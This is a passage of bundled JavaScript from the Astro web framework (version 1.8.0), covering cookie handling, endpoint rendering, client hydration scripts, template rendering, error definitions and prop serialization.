  const routes = [];
  for (const serializedRoute of serializedManifest.routes) {
    routes.push({
      ...serializedRoute,
      routeData: deserializeRouteData(serializedRoute.routeData)
    });
    const route = serializedRoute;
    route.routeData = deserializeRouteData(serializedRoute.routeData);
  }
  const assets = new Set(serializedManifest.assets);
  return {
    ...serializedManifest,
    assets,
    routes
  };
}

var __accessCheck$3 = (obj, member, msg) => {
  if (!member.has(obj))
    throw TypeError("Cannot " + msg);
};
var __privateGet$3 = (obj, member, getter) => {
  __accessCheck$3(obj, member, "read from private field");
  return getter ? getter.call(obj) : member.get(obj);
};
var __privateAdd$3 = (obj, member, value) => {
  if (member.has(obj))
    throw TypeError("Cannot add the same private member more than once");
  member instanceof WeakSet ? member.add(obj) : member.set(obj, value);
};
var __privateSet$3 = (obj, member, value, setter) => {
  __accessCheck$3(obj, member, "write to private field");
  setter ? setter.call(obj, value) : member.set(obj, value);
  return value;
};
var __privateMethod$1 = (obj, member, method) => {
  __accessCheck$3(obj, member, "access private method");
  return method;
};
var _request, _requestValues, _outgoing, _ensureParsed, ensureParsed_fn, _ensureOutgoingMap, ensureOutgoingMap_fn, _parse, parse_fn;
const DELETED_EXPIRATION = new Date(0);
const DELETED_VALUE = "deleted";
class AstroCookie {
  constructor(value) {
    this.value = value;
  }
  json() {
    if (this.value === void 0) {
      throw new Error(`Cannot convert undefined to an object.`);
    }
    return JSON.parse(this.value);
  }
  number() {
    return Number(this.value);
  }
  boolean() {
    if (this.value === "false")
      return false;
    if (this.value === "0")
      return false;
    return Boolean(this.value);
  }
}
class AstroCookies {
  constructor(request) {
    __privateAdd$3(this, _ensureParsed);
    __privateAdd$3(this, _ensureOutgoingMap);
    __privateAdd$3(this, _parse);
    __privateAdd$3(this, _request, void 0);
    __privateAdd$3(this, _requestValues, void 0);
    __privateAdd$3(this, _outgoing, void 0);
    __privateSet$3(this, _request, request);
    __privateSet$3(this, _requestValues, null);
    __privateSet$3(this, _outgoing, null);
  }
  delete(key, options) {
    const serializeOptions = {
      expires: DELETED_EXPIRATION
    };
    if (options == null ? void 0 : options.domain) {
      serializeOptions.domain = options.domain;
    }
    if (options == null ? void 0 : options.path) {
      serializeOptions.path = options.path;
    }
    __privateMethod$1(this, _ensureOutgoingMap, ensureOutgoingMap_fn).call(this).set(key, [
      DELETED_VALUE,
      serialize$1(key, DELETED_VALUE, serializeOptions),
      false
    ]);
  }
  get(key) {
    if (__privateGet$3(this, _outgoing) !== null && __privateGet$3(this, _outgoing).has(key)) {
      let [serializedValue, , isSetValue] = __privateGet$3(this, _outgoing).get(key);
      if (isSetValue) {
        return new AstroCookie(serializedValue);
      } else {
        return new AstroCookie(void 0);
      }
    }
    const values = __privateMethod$1(this, _ensureParsed, ensureParsed_fn).call(this);
    const value = values[key];
    return new AstroCookie(value);
  }
  has(key) {
    if (__privateGet$3(this, _outgoing) !== null && __privateGet$3(this, _outgoing).has(key)) {
      let [, , isSetValue] = __privateGet$3(this, _outgoing).get(key);
      return isSetValue;
    }
    const values = __privateMethod$1(this, _ensureParsed, ensureParsed_fn).call(this);
    return !!values[key];
  }
  set(key, value, options) {
    let serializedValue;
    if (typeof value === "string") {
      serializedValue = value;
    } else {
      let toStringValue = value.toString();
      if (toStringValue === Object.prototype.toString.call(value)) {
        serializedValue = JSON.stringify(value);
      } else {
        serializedValue = toStringValue;
      }
    }
    const serializeOptions = {};
    if (options) {
      Object.assign(serializeOptions, options);
    }
    __privateMethod$1(this, _ensureOutgoingMap, ensureOutgoingMap_fn).call(this).set(key, [
      serializedValue,
      serialize$1(key, serializedValue, serializeOptions),
      true
    ]);
  }
  *headers() {
    if (__privateGet$3(this, _outgoing) == null)
      return;
    for (const [, value] of __privateGet$3(this, _outgoing)) {
      yield value[1];
    }
  }
}
_request = new WeakMap();
_requestValues = new WeakMap();
_outgoing = new WeakMap();
_ensureParsed = new WeakSet();
ensureParsed_fn = function() {
  if (!__privateGet$3(this, _requestValues)) {
    __privateMethod$1(this, _parse, parse_fn).call(this);
  }
  if (!__privateGet$3(this, _requestValues)) {
    __privateSet$3(this, _requestValues, {});
  }
  return __privateGet$3(this, _requestValues);
};
_ensureOutgoingMap = new WeakSet();
ensureOutgoingMap_fn = function() {
  if (!__privateGet$3(this, _outgoing)) {
    __privateSet$3(this, _outgoing, /* @__PURE__ */ new Map());
  }
  return __privateGet$3(this, _outgoing);
};
_parse = new WeakSet();
parse_fn = function() {
  const raw = __privateGet$3(this, _request).headers.get("cookie");
  if (!raw) {
    return;
  }
  __privateSet$3(this, _requestValues, parse(raw));
};

const astroCookiesSymbol = Symbol.for("astro.cookies");
function attachToResponse(response, cookies) {
  Reflect.set(response, astroCookiesSymbol, cookies);
}
function getFromResponse(response) {
  let cookies = Reflect.get(response, astroCookiesSymbol);
  if (cookies != null) {
    return cookies;
  } else {
    return void 0;
  }
}
function* getSetCookiesFromResponse(response) {
  const cookies = getFromResponse(response);
  if (!cookies) {
    return;
  }
  for (const headerValue of cookies.headers()) {
    yield headerValue;
  }
}

function baseCreateComponent(cb, moduleId) {
  cb.isAstroComponentFactory = true;
  cb.moduleId = moduleId;
  return cb;
}
function createComponentWithOptions(opts) {
  const cb = baseCreateComponent(opts.factory, opts.moduleId);
  cb.propagation = opts.propagation;
  return cb;
}
function createComponent(arg1, moduleId) {
  if (typeof arg1 === "function") {
    return baseCreateComponent(arg1, moduleId);
  } else {
    return createComponentWithOptions(arg1);
  }
}

const ASTRO_VERSION = "1.8.0";

function createDeprecatedFetchContentFn() {
  return () => {
    throw new Error("Deprecated: Astro.fetchContent() has been replaced with Astro.glob().");
  };
}
function createAstroGlobFn() {
  const globHandler = (importMetaGlobResult, globValue) => {
    let allEntries = [...Object.values(importMetaGlobResult)];
    if (allEntries.length === 0) {
      throw new Error(`Astro.glob(${JSON.stringify(globValue())}) - no matches found.`);
    }
    return Promise.all(allEntries.map((fn) => fn()));
  };
  return globHandler;
}
function createAstro(filePathname, _site, projectRootStr) {
  const site = _site ? new URL(_site) : void 0;
  const referenceURL = new URL(filePathname, `http://localhost`);
  const projectRoot = new URL(projectRootStr);
  return {
    site,
    generator: `Astro v${ASTRO_VERSION}`,
    fetchContent: createDeprecatedFetchContentFn(),
    glob: createAstroGlobFn(),
    resolve(...segments) {
      let resolved = segments.reduce((u, segment) => new URL(segment, u), referenceURL).pathname;
      if (resolved.startsWith(projectRoot.pathname)) {
        resolved = "/" + resolved.slice(projectRoot.pathname.length);
      }
      return resolved;
    }
  };
}

function getHandlerFromModule(mod, method) {
  if (mod[method]) {
    return mod[method];
  }
  if (method === "delete" && mod["del"]) {
    return mod["del"];
  }
  if (mod["all"]) {
    return mod["all"];
  }
  return void 0;
}
async function renderEndpoint(mod, context, ssr) {
  var _a;
  const { request, params } = context;
  const chosenMethod = (_a = request.method) == null ? void 0 : _a.toLowerCase();
  const handler = getHandlerFromModule(mod, chosenMethod);
  if (!ssr && ssr === false && chosenMethod && chosenMethod !== "get") {
    console.warn(`
${chosenMethod} requests are not available when building a static site. Update your config to output: 'server' to handle ${chosenMethod} requests.`);
  }
  if (!handler || typeof handler !== "function") {
    let response = new Response(null, {
      status: 404,
      headers: {
        "X-Astro-Response": "Not-Found"
      }
    });
    return response;
  }
  if (handler.length > 1) {
    console.warn(`
API routes with 2 arguments have been deprecated. Instead they take a single argument in the form of:

export function get({ params, request }) {
	//...
}

Update your code to remove this warning.`);
  }
  const proxy = new Proxy(context, {
    get(target, prop) {
      if (prop in target) {
        return Reflect.get(target, prop);
      } else if (prop in params) {
        console.warn(`
API routes no longer pass params as the first argument. Instead an object containing a params property is provided in the form of:

export function get({ params }) {
	// ...
}

Update your code to remove this warning.`);
        return Reflect.get(params, prop);
      } else {
        return void 0;
      }
    }
  });
  return handler.call(mod, proxy, request);
}

const escapeHTML = escape;
class HTMLString extends String {
  get [Symbol.toStringTag]() {
    return "HTMLString";
  }
}
const markHTMLString = (value) => {
  if (value instanceof HTMLString) {
    return value;
  }
  if (typeof value === "string") {
    return new HTMLString(value);
  }
  return value;
};
function isHTMLString(value) {
  return Object.prototype.toString.call(value) === "[object HTMLString]";
}

const AstroJSX = "astro:jsx";
const Empty = Symbol("empty");
const toSlotName = (slotAttr) => slotAttr;
function isVNode(vnode) {
  return vnode && typeof vnode === "object" && vnode[AstroJSX];
}
function transformSlots(vnode) {
  if (typeof vnode.type === "string")
    return vnode;
  const slots = {};
  if (isVNode(vnode.props.children)) {
    const child = vnode.props.children;
    if (!isVNode(child))
      return;
    if (!("slot" in child.props))
      return;
    const name = toSlotName(child.props.slot);
    slots[name] = [child];
    slots[name]["$$slot"] = true;
    delete child.props.slot;
    delete vnode.props.children;
  }
  if (Array.isArray(vnode.props.children)) {
    vnode.props.children = vnode.props.children.map((child) => {
      if (!isVNode(child))
        return child;
      if (!("slot" in child.props))
        return child;
      const name = toSlotName(child.props.slot);
      if (Array.isArray(slots[name])) {
        slots[name].push(child);
      } else {
        slots[name] = [child];
        slots[name]["$$slot"] = true;
      }
      delete child.props.slot;
      return Empty;
    }).filter((v) => v !== Empty);
  }
  Object.assign(vnode.props, slots);
}
function markRawChildren(child) {
  if (typeof child === "string")
    return markHTMLString(child);
  if (Array.isArray(child))
    return child.map((c) => markRawChildren(c));
  return child;
}
function transformSetDirectives(vnode) {
  if (!("set:html" in vnode.props || "set:text" in vnode.props))
    return;
  if ("set:html" in vnode.props) {
    const children = markRawChildren(vnode.props["set:html"]);
    delete vnode.props["set:html"];
    Object.assign(vnode.props, { children });
    return;
  }
  if ("set:text" in vnode.props) {
    const children = vnode.props["set:text"];
    delete vnode.props["set:text"];
    Object.assign(vnode.props, { children });
    return;
  }
}
function createVNode(type, props) {
  const vnode = {
    [Renderer]: "astro:jsx",
    [AstroJSX]: true,
    type,
    props: props ?? {}
  };
  transformSetDirectives(vnode);
  transformSlots(vnode);
  return vnode;
}

var idle_prebuilt_default = `(self.Astro=self.Astro||{}).idle=t=>{const e=async()=>{await(await t())()};"requestIdleCallback"in window?window.requestIdleCallback(e):setTimeout(e,200)},window.dispatchEvent(new Event("astro:idle"));`;

var load_prebuilt_default = `(self.Astro=self.Astro||{}).load=a=>{(async()=>await(await a())())()},window.dispatchEvent(new Event("astro:load"));`;

var media_prebuilt_default = `(self.Astro=self.Astro||{}).media=(s,a)=>{const t=async()=>{await(await s())()};if(a.value){const e=matchMedia(a.value);e.matches?t():e.addEventListener("change",t,{once:!0})}},window.dispatchEvent(new Event("astro:media"));`;

var only_prebuilt_default = `(self.Astro=self.Astro||{}).only=t=>{(async()=>await(await t())())()},window.dispatchEvent(new Event("astro:only"));`;

var visible_prebuilt_default = `(self.Astro=self.Astro||{}).visible=(s,c,n)=>{const r=async()=>{await(await s())()};let i=new IntersectionObserver(e=>{for(const t of e)if(!!t.isIntersecting){i.disconnect(),r();break}});for(let e=0;e<n.children.length;e++){const t=n.children[e];i.observe(t)}},window.dispatchEvent(new Event("astro:visible"));`;

var astro_island_prebuilt_default = `var l;{const c={0:t=>t,1:t=>JSON.parse(t,o),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(JSON.parse(t,o)),5:t=>new Set(JSON.parse(t,o)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(JSON.parse(t)),9:t=>new Uint16Array(JSON.parse(t)),10:t=>new Uint32Array(JSON.parse(t))},o=(t,s)=>{if(t===""||!Array.isArray(s))return s;const[e,n]=s;return e in c?c[e](n):void 0};customElements.get("astro-island")||customElements.define("astro-island",(l=class extends HTMLElement{constructor(){super(...arguments);this.hydrate=()=>{if(!this.hydrator||this.parentElement&&this.parentElement.closest("astro-island[ssr]"))return;const s=this.querySelectorAll("astro-slot"),e={},n=this.querySelectorAll("template[data-astro-template]");for(const r of n){const i=r.closest(this.tagName);!i||!i.isSameNode(this)||(e[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(const r of s){const i=r.closest(this.tagName);!i||!i.isSameNode(this)||(e[r.getAttribute("name")||"default"]=r.innerHTML)}const a=this.hasAttribute("props")?JSON.parse(this.getAttribute("props"),o):{};this.hydrator(this)(this.Component,a,e,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),window.removeEventListener("astro:hydrate",this.hydrate),window.dispatchEvent(new CustomEvent("astro:hydrate"))}}connectedCallback(){!this.hasAttribute("await-children")||this.firstChild?this.childrenConnectedCallback():new MutationObserver((s,e)=>{e.disconnect(),this.childrenConnectedCallback()}).observe(this,{childList:!0})}async childrenConnectedCallback(){window.addEventListener("astro:hydrate",this.hydrate);let s=this.getAttribute("before-hydration-url");s&&await import(s),this.start()}start(){const s=JSON.parse(this.getAttribute("opts")),e=this.getAttribute("client");if(Astro[e]===void 0){window.addEventListener(\`astro:\${e}\`,()=>this.start(),{once:!0});return}Astro[e](async()=>{const n=this.getAttribute("renderer-url"),[a,{default:r}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),i=this.getAttribute("component-export")||"default";if(!i.includes("."))this.Component=a[i];else{this.Component=a;for(const d of i.split("."))this.Component=this.Component[d]}return this.hydrator=r,this.hydrate},s,this)}attributeChangedCallback(){this.hydrator&&this.hydrate()}},l.observedAttributes=["props"],l))}`;

function determineIfNeedsHydrationScript(result) {
  if (result._metadata.hasHydrationScript) {
    return false;
  }
  return result._metadata.hasHydrationScript = true;
}
const hydrationScripts = {
  idle: idle_prebuilt_default,
  load: load_prebuilt_default,
  only: only_prebuilt_default,
  media: media_prebuilt_default,
  visible: visible_prebuilt_default
};
function determinesIfNeedsDirectiveScript(result, directive) {
  if (result._metadata.hasDirectives.has(directive)) {
    return false;
  }
  result._metadata.hasDirectives.add(directive);
  return true;
}
function getDirectiveScriptText(directive) {
  if (!(directive in hydrationScripts)) {
    throw new Error(`Unknown directive: ${directive}`);
  }
  const directiveScriptText = hydrationScripts[directive];
  return directiveScriptText;
}
function getPrescripts(type, directive) {
  switch (type) {
    case "both":
      return `<style>astro-island,astro-slot{display:contents}</style><script>${getDirectiveScriptText(directive) + astro_island_prebuilt_default}<\/script>`;
    case "directive":
      return `<script>${getDirectiveScriptText(directive)}<\/script>`;
  }
  return "";
}

const headAndContentSym = Symbol.for("astro.headAndContent");
function isHeadAndContent(obj) {
  return typeof obj === "object" && !!obj[headAndContentSym];
}

function serializeListValue(value) {
  const hash = {};
  push(value);
  return Object.keys(hash).join(" ");
  function push(item) {
    if (item && typeof item.forEach === "function")
      item.forEach(push);
    else if (item === Object(item))
      Object.keys(item).forEach((name) => {
        if (item[name])
          push(name);
      });
    else {
      item = item === false || item == null ? "" : String(item).trim();
      if (item) {
        item.split(/\s+/).forEach((name) => {
          hash[name] = true;
        });
      }
    }
  }
}
function isPromise(value) {
  return !!value && typeof value === "object" && typeof value.then === "function";
}

var _a$3;
const renderTemplateResultSym = Symbol.for("astro.renderTemplateResult");
class RenderTemplateResult {
  constructor(htmlParts, expressions) {
    this[_a$3] = true;
    this.htmlParts = htmlParts;
    this.error = void 0;
    this.expressions = expressions.map((expression) => {
      if (isPromise(expression)) {
        return Promise.resolve(expression).catch((err) => {
          if (!this.error) {
            this.error = err;
            throw err;
          }
        });
      }
      return expression;
    });
  }
  get [(_a$3 = renderTemplateResultSym, Symbol.toStringTag)]() {
    return "AstroComponent";
  }
  async *[Symbol.asyncIterator]() {
    const { htmlParts, expressions } = this;
    for (let i = 0; i < htmlParts.length; i++) {
      const html = htmlParts[i];
      const expression = expressions[i];
      yield markHTMLString(html);
      yield* renderChild(expression);
    }
  }
}
function isRenderTemplateResult(obj) {
  return typeof obj === "object" && !!obj[renderTemplateResultSym];
}
async function* renderAstroTemplateResult(component) {
  for await (const value of component) {
    if (value || value === 0) {
      for await (const chunk of renderChild(value)) {
        switch (chunk.type) {
          case "directive": {
            yield chunk;
            break;
          }
          default: {
            yield markHTMLString(chunk);
            break;
          }
        }
      }
    }
  }
}
function renderTemplate(htmlParts, ...expressions) {
  return new RenderTemplateResult(htmlParts, expressions);
}

function isAstroComponentFactory(obj) {
  return obj == null ? false : obj.isAstroComponentFactory === true;
}
async function renderToString(result, componentFactory, props, children) {
  const factoryResult = await componentFactory(result, props, children);
  if (factoryResult instanceof Response) {
    const response = factoryResult;
    throw response;
  }
  let parts = new HTMLParts();
  const templateResult = isHeadAndContent(factoryResult) ? factoryResult.content : factoryResult;
  for await (const chunk of renderAstroTemplateResult(templateResult)) {
    parts.append(chunk, result);
  }
  return parts.toString();
}
function isAPropagatingComponent(result, factory) {
  let hint = factory.propagation || "none";
  if (factory.moduleId && result.propagation.has(factory.moduleId) && hint === "none") {
    hint = result.propagation.get(factory.moduleId);
  }
  return hint === "in-tree" || hint === "self";
}

const defineErrors = (errs) => errs;
const AstroErrorData = defineErrors({
  UnknownCompilerError: {
    title: "Unknown compiler error.",
    code: 1e3
  },
  StaticRedirectNotAvailable: {
    title: "`Astro.redirect` is not available in static mode.",
    code: 3001,
    message: "Redirects are only available when using `output: 'server'`. Update your Astro config if you need SSR features.",
    hint: "See https://docs.astro.build/en/guides/server-side-rendering/#enabling-ssr-in-your-project for more information on how to enable SSR."
  },
  ClientAddressNotAvailable: {
    title: "`Astro.clientAddress` is not available in current adapter.",
    code: 3002,
    message: (adapterName) => `\`Astro.clientAddress\` is not available in the \`${adapterName}\` adapter. File an issue with the adapter to add support.`
  },
  StaticClientAddressNotAvailable: {
    title: "`Astro.clientAddress` is not available in static mode.",
    code: 3003,
    message: "`Astro.clientAddress` is only available when using `output: 'server'`. Update your Astro config if you need SSR features.",
    hint: "See https://docs.astro.build/en/guides/server-side-rendering/#enabling-ssr-in-your-project for more information on how to enable SSR."
  },
  NoMatchingStaticPathFound: {
    title: "No static path found for requested path.",
    code: 3004,
    message: (pathName) => `A \`getStaticPaths()\` route pattern was matched, but no matching static path was found for requested path \`${pathName}\`.`,
    hint: (possibleRoutes) => `Possible dynamic routes being matched: ${possibleRoutes.join(", ")}.`
  },
  OnlyResponseCanBeReturned: {
    title: "Invalid type returned by Astro page.",
    code: 3005,
    message: (route, returnedValue) => `Route \`${route ? route : ""}\` returned a \`${returnedValue}\`. Only a [Response](https://developer.mozilla.org/en-US/docs/Web/API/Response) can be returned from Astro files.`,
    hint: "See https://docs.astro.build/en/guides/server-side-rendering/#response for more information."
  },
  MissingMediaQueryDirective: {
    title: "Missing value for `client:media` directive.",
    code: 3006,
    message: 'Media query not provided for `client:media` directive. A media query similar to `client:media="(max-width: 600px)"` must be provided'
  },
  NoMatchingRenderer: {
    title: "No matching renderer found.",
    code: 3007,
    message: (componentName, componentExtension, plural, validRenderersCount) => `Unable to render \`${componentName}\`.

${validRenderersCount > 0 ? `There ${plural ? "are." : "is."} ${validRenderersCount} renderer${plural ? "s." : ""} configured in your \`astro.config.mjs\` file,
but ${plural ? "none were." : "it was not."} able to server-side render \`${componentName}\`.` : `No valid renderer was found ${componentExtension ? `for the \`.${componentExtension}\` file extension.` : `for this file extension.`}`}`,
    hint: (probableRenderers) => `Did you mean to enable the ${probableRenderers} integration?

See https://docs.astro.build/en/core-concepts/framework-components/ for more information on how to install and configure integrations.`
  },
  NoClientEntrypoint: {
    title: "No client entrypoint specified in renderer.",
    code: 3008,
    message: (componentName, clientDirective, rendererName) => `\`${componentName}\` component has a \`client:${clientDirective}\` directive, but no client entrypoint was provided by \`${rendererName}\`.`,
    hint: "See https://docs.astro.build/en/reference/integrations-reference/#addrenderer-option for more information on how to configure your renderer."
  },
  NoClientOnlyHint: {
    title: "Missing hint on client:only directive.",
    code: 3009,
    message: (componentName) => `Unable to render \`${componentName}\`. When using the \`client:only\` hydration strategy, Astro needs a hint to use the correct renderer.`,
    hint: (probableRenderers) => `Did you mean to pass \`client:only="${probableRenderers}"\`? See https://docs.astro.build/en/reference/directives-reference/#clientonly for more information on client:only`
  },
  InvalidGetStaticPathParam: {
    title: "Invalid value returned by a `getStaticPaths` path.",
    code: 3010,
    message: (paramType) => `Invalid params given to \`getStaticPaths\` path. Expected an \`object\`, got \`${paramType}\``,
    hint: "See https://docs.astro.build/en/reference/api-reference/#getstaticpaths for more information on getStaticPaths."
  },
  InvalidGetStaticPathsReturn: {
    title: "Invalid value returned by getStaticPaths.",
    code: 3011,
    message: (returnType) => `Invalid type returned by \`getStaticPaths\`. Expected an \`array\`, got \`${returnType}\``,
    hint: "See https://docs.astro.build/en/reference/api-reference/#getstaticpaths for more information on getStaticPaths."
  },
  GetStaticPathsRemovedRSSHelper: {
    title: "getStaticPaths RSS helper is not available anymore.",
    code: 3012,
    message: "The RSS helper has been removed from `getStaticPaths`. Try the new @astrojs/rss package instead.",
    hint: "See https://docs.astro.build/en/guides/rss/ for more information."
  },
  GetStaticPathsExpectedParams: {
    title: "Missing params property on `getStaticPaths` route.",
    code: 3013,
    message: "Missing or empty required `params` property on `getStaticPaths` route.",
    hint: "See https://docs.astro.build/en/reference/api-reference/#getstaticpaths for more information on getStaticPaths."
  },
  GetStaticPathsInvalidRouteParam: {
    title: "Invalid value for `getStaticPaths` route parameter.",
    code: 3014,
    message: (key, value, valueType) => `Invalid getStaticPaths route parameter for \`${key}\`. Expected undefined, a string or a number, received \`${valueType}\` (\`${value}\`)`,
    hint: "See https://docs.astro.build/en/reference/api-reference/#getstaticpaths for more information on getStaticPaths."
  },
  GetStaticPathsRequired: {
    title: "`getStaticPaths()` function required for dynamic routes.",
    code: 3015,
    message: "`getStaticPaths()` function is required for dynamic routes. Make sure that you `export` a `getStaticPaths` function from your dynamic route.",
    hint: `See https://docs.astro.build/en/core-concepts/routing/#dynamic-routes for more information on dynamic routes.

Alternatively, set \`output: "server"\` in your Astro config file to switch to a non-static server build.
See https://docs.astro.build/en/guides/server-side-rendering/ for more information on non-static rendering.`
  },
  ReservedSlotName: {
    title: "Invalid slot name.",
    code: 3016,
    message: (slotName) => `Unable to create a slot named \`${slotName}\`. \`${slotName}\` is a reserved slot name. Please update the name of this slot.`
  },
  NoAdapterInstalled: {
    title: "Cannot use Server-side Rendering without an adapter.",
    code: 3017,
    message: `Cannot use \`output: 'server'\` without an adapter. Please install and configure the appropriate server adapter for your final deployment.`,
    hint: "See https://docs.astro.build/en/guides/server-side-rendering/ for more information."
  },
  NoMatchingImport: {
    title: "No import found for component.",
    code: 3018,
    message: (componentName) => `Could not render \`${componentName}\`. No matching import has been found for \`${componentName}\`.`,
    hint: "Please make sure the component is properly imported."
  },
  InvalidPrerenderExport: {
    title: "Invalid prerender export.",
    code: 3019,
    message: (prefix, suffix) => {
      let msg = `A \`prerender\` export has been detected, but its value cannot be statically analyzed.`;
      if (prefix !== "const")
        msg += `
Expected \`const\` declaration but got \`${prefix}\`.`;
      if (suffix !== "true")
        msg += `
Expected \`true\` value but got \`${suffix}\`.`;
      return msg;
    },
    hint: "Mutable values declared at runtime are not supported. Please make sure to use exactly `export const prerender = true`."
  },
  UnknownViteError: {
    title: "Unknown Vite Error.",
    code: 4e3
  },
  FailedToLoadModuleSSR: {
    title: "Could not import file.",
    code: 4001,
    message: (importName) => `Could not import \`${importName}\`.`,
    hint: "This is often caused by a typo in the import path. Please make sure the file exists."
  },
  InvalidGlob: {
    title: "Invalid glob pattern.",
    code: 4002,
    message: (globPattern) => `Invalid glob pattern: \`${globPattern}\`. Glob patterns must start with './', '../' or '/'.`,
    hint: "See https://docs.astro.build/en/guides/imports/#glob-patterns for more information on supported glob patterns."
  },
  UnknownCSSError: {
    title: "Unknown CSS Error.",
    code: 5e3
  },
  CSSSyntaxError: {
    title: "CSS Syntax Error.",
    code: 5001
  },
  UnknownMarkdownError: {
    title: "Unknown Markdown Error.",
    code: 6e3
  },
  MarkdownFrontmatterParseError: {
    title: "Failed to parse Markdown frontmatter.",
    code: 6001
  },
  MarkdownContentSchemaValidationError: {
    title: "Content collection frontmatter invalid.",
    code: 6002,
    message: (collection, entryId, error) => {
      return [
        `${String(collection)} \u2192 ${String(entryId)} frontmatter does not match collection schema.`,
        ...error.errors.map((zodError) => zodError.message)
      ].join("\n");
    },
    hint: "See https://docs.astro.build/en/guides/content-collections/ for more information on content schemas."
  },
  UnknownConfigError: {
    title: "Unknown configuration error.",
    code: 7e3
  },
  ConfigNotFound: {
    title: "Specified configuration file not found.",
    code: 7001,
    message: (configFile) => `Unable to resolve \`--config "${configFile}"\`. Does the file exist?`
  },
  ConfigLegacyKey: {
    title: "Legacy configuration detected.",
    code: 7002,
    message: (legacyConfigKey) => `Legacy configuration detected: \`${legacyConfigKey}\`.`,
    hint: "Please update your configuration to the new format.\nSee https://astro.build/config for more information."
  },
  UnknownCLIError: {
    title: "Unknown CLI Error.",
    code: 8e3
  },
  GenerateContentTypesError: {
    title: "Failed to generate content types.",
    code: 8001,
    message: "`astro sync` command failed to generate content collection types.",
    hint: "Check your `src/content/config.*` file for typos."
  },
  UnknownError: {
    title: "Unknown Error.",
    code: 99999
  }
});

function normalizeLF(code) {
  return code.replace(/\r\n|\r(?!\n)|\n/g, "\n");
}
function getErrorDataByCode(code) {
  const entry = Object.entries(AstroErrorData).find((data) => data[1].code === code);
  if (entry) {
    return {
      name: entry[0],
      data: entry[1]
    };
  }
}

function codeFrame(src, loc) {
  if (!loc || loc.line === void 0 || loc.column === void 0) {
    return "";
  }
  const lines = normalizeLF(src).split("\n").map((ln) => ln.replace(/\t/g, "  "));
  const visibleLines = [];
  for (let n = -2; n <= 2; n++) {
    if (lines[loc.line + n])
      visibleLines.push(loc.line + n);
  }
  let gutterWidth = 0;
  for (const lineNo of visibleLines) {
    let w = `> ${lineNo}`;
    if (w.length > gutterWidth)
      gutterWidth = w.length;
  }
  let output = "";
  for (const lineNo of visibleLines) {
    const isFocusedLine = lineNo === loc.line - 1;
    output += isFocusedLine ? "> " : "  ";
    output += `${lineNo + 1} | ${lines[lineNo]}
`;
    if (isFocusedLine)
      output += `${Array.from({ length: gutterWidth }).join(" ")}  | ${Array.from({
        length: loc.column
      }).join(" ")}^
`;
  }
  return output;
}

class AstroError extends Error {
  constructor(props, ...params) {
    var _a;
    super(...params);
    this.type = "AstroError";
    const { code, name, title, message, stack, location, hint, frame } = props;
    this.errorCode = code;
    if (name && name !== "Error") {
      this.name = name;
    } else {
      this.name = ((_a = getErrorDataByCode(this.errorCode)) == null ? void 0 : _a.name) ?? "UnknownError";
    }
    this.title = title;
    if (message)
      this.message = message;
    this.stack = stack ? stack : this.stack;
    this.loc = location;
    this.hint = hint;
    this.frame = frame;
  }
  setErrorCode(errorCode) {
    this.errorCode = errorCode;
  }
  setLocation(location) {
    this.loc = location;
  }
  setName(name) {
    this.name = name;
  }
  setMessage(message) {
    this.message = message;
  }
  setHint(hint) {
    this.hint = hint;
  }
  setFrame(source, location) {
    this.frame = codeFrame(source, location);
  }
  static is(err) {
    return err.type === "AstroError";
  }
}

const PROP_TYPE = {
  Value: 0,
  JSON: 1,
  RegExp: 2,
  Date: 3,
  Map: 4,
  Set: 5,
  BigInt: 6,
  URL: 7,
  Uint8Array: 8,
  Uint16Array: 9,
  Uint32Array: 10
};
function serializeArray(value, metadata = {}, parents = /* @__PURE__ */ new WeakSet()) {
  if (parents.has(value)) {
    throw new Error(`Cyclic reference detected while serializing props for <${metadata.displayName} client:${metadata.hydrate}>!

Cyclic references cannot be safely serialized for client-side usage. Please remove the cyclic reference.`);
  }
  parents.add(value);
  const serialized = value.map((v) => {
    return convertToSerializedForm(v, metadata, parents);
  });
  parents.delete(value);
  return serialized;
}
function serializeObject(value, metadata = {}, parents = /* @__PURE__ */ new WeakSet()) {
  if (parents.has(value)) {
    throw new Error(`Cyclic reference detected while serializing props for <${metadata.displayName} client:${metadata.hydrate}>!

Cyclic references cannot be safely serialized for client-side usage. Please remove the cyclic reference.`);
  }
  parents.add(value);
  const serialized = Object.fromEntries(
    Object.entries(value).map(([k, v]) => {
      return [k, convertToSerializedForm(v, metadata, parents)];
    })
  );
  parents.delete(value);
  return serialized;
}
function convertToSerializedForm(value, metadata = {}, parents = /* @__PURE__ */ new WeakSet()) {
  const tag = Object.prototype.toString.call(value);
  switch (tag) {
    case "[object Date]": {
      return [PROP_TYPE.Date, value.toISOString()];
    }
    case "[object RegExp]": {
      return [PROP_TYPE.RegExp, value.source];
    }
    case "[object Map]": {
      return [
        PROP_TYPE.Map,
        JSON.stringify(serializeArray(Array.from(value), metadata, parents))
      ];
    }
    case "[object Set]": {
      return [
        PROP_TYPE.Set,
        JSON.stringify(serializeArray(Array.from(value), metadata, parents))
      ];
    }
    case "[object BigInt]": {
      return [PROP_TYPE.BigInt, value.toString()];
    }
    case "[object URL]": {
      return [PROP_TYPE.URL, value.toString()];
    }
    case "[object Array]": {
      return [PROP_TYPE.JSON, JSON.stringify(serializeArray(value, metadata, parents))];
    }
    case "[object Uint8Array]": {
      return [PROP_TYPE.Uint8Array, JSON.stringify(Array.from(value))];
    }
    case "[object Uint16Array]": {
      return [PROP_TYPE.Uint16Array, JSON.stringify(Array.from(value))];
    }
    case "[object Uint32Array]": {
      return [PROP_TYPE.Uint32Array, JSON.stringify(Array.from(value))];
    }
    default: {
      if (value !== null && typeof value === "object") {
        return [PROP_TYPE.Value, serializeObject(value, metadata, parents)];
      } else {
        return [PROP_TYPE.Value, value];
      }
    }
  }
}
function serializeProps(props, metadata) {
  const serialized = JSON.stringify(serializeObject(props, metadata));
  return serialized;
}

const HydrationDirectivesRaw = ["load", "idle", "media", "visible", "only"];
const HydrationDirectives = new Set(HydrationDirectivesRaw);
const HydrationDirectiveProps = new Set(HydrationDirectivesRaw.map((n) => `client:${n}`));
function extractDirectives(displayName, inputProps) {
  let extracted = {
    isPage: false,
    hydration: null,
    props: {}
  };
  for (const [key, value] of Object.entries(inputProps)) {
    if (key.startsWith("server:")) {
      if (key === "server:root") {
        extracted.isPage = true;
      }
    }
    if (key.startsWith("client:")) {
